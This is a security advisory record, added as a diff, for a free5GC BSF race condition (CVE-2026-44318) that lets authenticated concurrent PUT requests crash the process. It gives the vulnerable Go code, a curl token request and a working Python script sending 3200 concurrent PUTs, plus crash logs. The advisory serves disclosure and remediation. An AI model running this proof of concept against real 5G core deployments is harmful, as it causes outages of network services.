@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-27ph-8q4f-h7m7",
+  "modified": "2026-05-08T22:46:17.982989Z",
+  "published": "2026-05-08T22:41:48Z",
+  "aliases": [
+    "CVE-2026-44318"
+  ],
+  "summary": "free5GC's BSF concurrent PUT /nbsf-management/v1/subscriptions/{subId} crashes the BSF process via concurrent map read/write on Subscriptions",
+  "details": "### Summary\nfree5GC's BSF `PUT /nbsf-management/v1/subscriptions/{subId}` handler has an unsynchronized write on the global `Subscriptions` map. The handler first reads the map under `RLock()` via `BSFContext.GetSubscription(subId)`, but if the subscription does not exist, `ReplaceIndividualSubcription()` writes back to the same map directly without taking the mutex (`bsfContext.BsfSelf.Subscriptions[subId] = subscription`). Under concurrent authenticated PUT load, one goroutine can read while another writes the map, which causes the Go runtime to abort the process with `fatal error: concurrent map read and map write` (Go runtime panics that come from concurrent map access bypass `recover()` and terminate the process). The BSF container exits with code `2` -- the entire BSF SBI surface goes down until restart.\n\nThis endpoint requires a valid `nbsf-management` OAuth2 access token (PR:L, NOT PR:N), so this is scored as an authenticated process-kill DoS.\n\n### Details\nValidated against the BSF container in the official Docker compose lab.\n- Source repo tag: `v4.2.1`\n- Running Docker image: `free5gc/bsf:v4.2.1`\n- Docker validation date: 2026-03-22\n- BSF endpoint: `http://10.100.200.11:8000`\n\nRead side (locked):\n```go\nfunc (c *BSFContext) GetSubscription(subId string) (*BsfSubscription, bool) {\n    c.mutex.RLock()\n    defer c.mutex.RUnlock()\n\n    sub, exists := c.Subscriptions[subId]\n    return sub, exists\n}\n```\n\nUnsafe write side in the create-if-absent branch of `ReplaceIndividualSubcription` (no `Lock()`):\n```go\nsubscription.SubId = subId\nbsfContext.BsfSelf.Subscriptions[subId] = subscription\n```\n\nUnder concurrent traffic, the Go runtime detects the unsynchronized read/write on `c.Subscriptions` and aborts the process. Go's `concurrent map read and map write` fatal is NOT a normal panic -- it is unrecoverable, Gin's recovery middleware does not catch it, and the BSF process terminates.\n\nCode evidence (paths in `free5gc/bsf`):\n- Read side (locked):\n  - `NFs/bsf/internal/sbi/processor/subscriptions.go:81`\n  - `NFs/bsf/internal/context/context.go:726`\n  - `NFs/bsf/internal/context/context.go:730`\n- Unsafe write side (the create-if-absent branch in PUT, no lock):\n  - `NFs/bsf/internal/sbi/processor/subscriptions.go:111`\n  - `NFs/bsf/internal/sbi/processor/subscriptions.go:114`\n\nThe normal locked helpers (`CreateSubscription()`, `GetSubscription()`, `UpdateSubscription()`, `DeleteSubscription()`) DO take the mutex correctly. The bug is specific to the inline write inside the PUT create-if-absent branch.\n\n### PoC\nReproduced end-to-end against the running BSF at `http://10.100.200.11:8000`.\n\n1. Obtain a valid `nbsf-management` token from NRF:\n```\ncurl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'grant_type=client_credentials\u0026nfType=NEF\u0026nfInstanceId=eb9990de-4cd3-41b0-b5d9-c2102b088c57\u0026targetNfType=BSF\u0026scope=nbsf-management'\n```\n\n2. Send concurrent PUT requests against fresh `subId` values (the validated lab uses 64 worker threads x 50 fresh subIds = 3200 concurrent PUTs):\n```python\nimport json, threading, urllib.request\n\nTOKEN = \"\u003cvalid_nbsf_management_jwt\u003e\"\nBASE = \"http://10.100.200.11:8000/nbsf-management/v1\"\nPAYLOAD = json.dumps({\n    \"events\": [\"PCF_BINDING_CREATION\"],\n    \"notifUri\": \"http://127.0.0.1/cb\",\n    \"notifCorreId\": \"1\",\n    \"supi\": \"imsi-208930000000003\",\n}).encode()\n\ndef send_put(i, n):\n    url = f\"{BASE}/subscriptions/race-mix-{i}-{n}\"\n    req = urllib.request.Request(url, data=PAYLOAD, method=\"PUT\")\n    req.add_header(\"Authorization\", f\"Bearer {TOKEN}\")\n    req.add_header(\"Content-Type\", \"application/json\")\n    urllib.request.urlopen(req, timeout=2).read()\n\nthreads = []\nfor i in range(64):\n    for n in range(50):\n        threads.append(threading.Thread(target=send_put, args=(i, n)))\nfor t in threads: t.start()\nfor t in threads: t.join()\n```\n\n3. BSF container logs (`docker logs bsf`) show the Go runtime fatal that terminated the process:\n```\n[INFO][BSF][Proc] Handle ReplaceIndividualSubcription\nfatal error: concurrent map read and map write\ngithub.com/free5gc/bsf/internal/sbi/processor.ReplaceIndividualSubcription(0xc000514300)\n    github.com/free5gc/bsf/internal/sbi/processor/subscriptions.go:81 +0x15f\n```\n\n4. Container state confirms exit code 2:\n```\nexited|2|0\n```\n\n### Impact\nUnsynchronized concurrent access (CWE-362) to a shared map (`BsfSelf.Subscriptions`), combined with missing synchronization on the create-if-absent branch (CWE-820). Go's runtime detects concurrent map read/write and terminates the process via a non-recoverable fatal error -- Gin's `recover()` middleware does NOT catch this class of fatal, unlike ordinary nil-deref panics. The whole BSF process exits, dropping BSF's `nbsf-management` SBI surface (PCF binding lookups for SMF, AF -\u003e PCF binding discovery, etc.) until restart.\n\nAny party that holds (or can obtain) a valid `nbsf-management` token can:\n- Drive the create-if-absent code path at high concurrency by PUTting a stream of fresh `subId` values, deterministically tripping the runtime fatal and killing the BSF process.\n- Repeat the trigger after every restart to sustain the outage.\n\nNo Confidentiality impact (the crash returns no attacker-readable data). No persistent Integrity impact (BSF subscription state is in-memory and is lost when the process dies). The whole impact concentrates in Availability: complete loss of BSF service via concurrent attacker traffic on a single endpoint.\n\nAffected: free5gc v4.2.1.\n\nUpstream issue: https://github.com/free5gc/free5gc/issues/926\nUpstream fix: https://github.com/free5gc/bsf/pull/7",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/free5gc/bsf",
+        "purl": "pkg:golang/github.com/free5gc/bsf"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.0.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-27ph-8q4f-h7m7/GHSA-27ph-8q4f-h7m7.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/security/advisories/GHSA-27ph-8q4f-h7m7"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/issues/926"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/bsf/pull/7"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/bsf/commit/277908565fd628d974a13ef562b81a8b7b519ffa"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/free5gc/free5gc"
+    }
+  ]
+}
